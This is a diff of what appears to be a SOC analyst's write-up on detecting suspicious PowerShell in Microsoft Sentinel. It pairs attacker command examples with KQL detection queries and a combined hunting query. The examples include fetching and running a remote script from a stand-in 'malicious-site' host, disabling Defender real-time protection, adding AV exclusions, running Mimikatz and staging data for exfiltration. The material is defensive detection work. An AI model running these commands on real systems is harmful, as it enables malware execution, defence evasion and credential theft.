@@ -128,13 +128,15 @@ DeviceProcessEvents
 </p>
 
 <b>Screenshot1:</b> Shows me creating a KQL query to detect suspicious PowerShell activity involving Invoke-WebRequest, a command commonly abused by attackers to download malicious payloads or external scripts.<br>
+
 <b>Screenshot2:</b> Shows me creating a detection rule using KQL queries and entity mapping within Microsoft Sentinel to generate the relevant data and investigation results required for security analysis.<br>
+
 <b>Screenshot3:</b> Shows me gathering relevant investigation data and compiling my findings within the activity log for escalation to senior SOC analysts. <b>Process:</b> `Sentinel - Threat Management - Incidents - Target Host - Assign Owner (Me) - Change Status: Active - View Full Details - Investigate - Copy & Paste Commands found into notes (See below)`
 
-<h3>Detection & Analysis -</h3> <b>Prepare findings in this format for submission</b><br>
-Upon investigating the triggered incident, document the affected host/device name, number of related events, and any suspicious activity identified during analysis.
+<h3>Detection & Analysis</h3> <b>Prepare findings in this format for submission</b><br>
+Upon investigating the triggered incident, document the affected host/device name, number of related events, and any suspicious activity identified during analysis.<br>
 
-<b>Scripts</b> <br>
+<b>Scripts</b><br>
 Copy and paste the relevant PowerShell scripts, commands, or payloads associated with the alert into the investigation notes for documentation and escalation purposes.
 
 <b>Commands</b><br>
@@ -153,7 +155,7 @@ any identified indicators of compromise (IOCs)</li>
 </ul>
 
 
-<h3>Containment, Eradication, and Recovery:</h3> 
+<h3>Containment, Eradication, and Recovery</h3> 
 
 <b>Isolate</b><br>
 
@@ -187,8 +189,108 @@ DeviceProcessEvents
 
 <b>Invoke-WebRequest:</b> downloading malware, pulling payloads, retrieving scripts from external servers
 
-PowerShell Command
-`Invoke-WebRequest http://malicious-site/payload.exe`
+PowerShell Command: `Invoke-WebRequest http://malicious-site/payload.exe`<br>
+MITRE ATT&CK: T1059.001 PowerShell, T1105 Ingress Tool Transfer<br>
+kql: `DeviceProcessEvents
+| where FileName =~ "powershell.exe"
+| where ProcessCommandLine contains "Invoke-WebRequest"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine`
+
+<b>Invoke-Expression (IEX):</b> executing downloaded code directly in memory, obfuscation, malware execution
+
+PowerShell Command: `IEX (New-Object Net.WebClient).DownloadString('http://malicious-site/script.ps1')`<br>
+MITRE ATT&CK: 059.001 PowerShell<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine has_any ("Invoke-Expression","IEX")`
+
+<b>Downloadstring:</b> fileless malware, remote script execution
+
+PowerShell Command: `(New-Object Net.WebClient).DownloadString('http://malicious-site/script.ps1')`<br>
+MITRE ATT&CK: T1105, T1059.001<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine contains "DownloadString"`
+
+<b>EncodedCommand:</b> obfuscation, bypassing detections, hiding payloads
+
+PowerShell Command: `powershell.exe -EncodedCommand SQBtAG0AYQBsAGkAYwBpAG8AdQBz`<br>
+MITRE ATT&CK: T1027 Obfuscated Files, Information T1059.001<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine contains "EncodedCommand"`
+
+<b>Start-Process:</b> aunching payloads, spawning malware, executing secondary tools
+
+PowerShell Command: `Start-Process malware.exe`<br>
+MITRE ATT&CK: T1059.001<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine contains "Start-Process"`
+
+<b>Add-MpPreference:</b> disabling Microsoft Defender protections, adding AV exclusions
+
+PowerShell Command:`Add-MpPreference -ExclusionPath C:\Temp`<br>
+MITRE ATT&CK: T1562.001 Impair Defenses<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine contains "Add-MpPreference"`
+
+<b>Set-MpPreference:</b> disabling real-time protection, weakening AV
+
+PowerShell Command:`Set-MpPreference -DisableRealtimeMonitoring $true`<br>
+MITRE ATT&CK:T1562.001<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine contains "Set-MpPreference"`
+
+<b>Compress-Archive:</b> preparing files for exfiltration, staging stolen data
+
+PowerShell Command:`Compress-Archive C:\SensitiveData data.zip`<br>
+MITRE ATT&CK: T1560 — Archive Collected Data<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine contains "Compress-Archive"`
+
+<b>Test-NetConnection:</b> reconnaissance, internal network scanning, checking reachable systems
+
+PowerShell Command:`Test-NetConnection 10.0.0.5 -Port 3389`<br>
+MITRE ATT&CK: T1046 Network Service Scanning<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine contains "Test-NetConnection"`
+
+<b>Get-Credential:</b> credential harvesting, phishing prompts
+
+PowerShell Command:`Get-Credential`<br>
+MITRE ATT&CK: T1056 Input Capture<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine contains "Get-Credential"`
+
+<b>Invoke-Mimikatz:</b> credential dumping, LSASS theft
+
+PowerShell Command:`Invoke-Mimikatz`<br>
+MITRE ATT&CK: T1003 OS Credential Dumping<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine contains "Mimikatz"`
+
+<b>Net.WebClient:</b> outbound communications, downloading payloads
+
+PowerShell Command:`New-Object Net.WebClient`<br>
+MITRE ATT&CK: T1105<br>
+kql:`DeviceProcessEvents
+| where ProcessCommandLine contains "Net.WebClient"`
+
+<h3>SOC Hunting Query</h3>
+
+`DeviceProcessEvents
+| where FileName =~ "powershell.exe"
+| where ProcessCommandLine has_any (
+    "Invoke-WebRequest",
+    "DownloadString",
+    "EncodedCommand",
+    "IEX",
+    "Net.WebClient",
+    "Mimikatz",
+    "Add-MpPreference",
+    "Set-MpPreference",
+    "Compress-Archive",
+    "Test-NetConnection"
+)
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+| order by Timestamp desc`
 
 
 <h2>Potential Impossible Travel</h2>
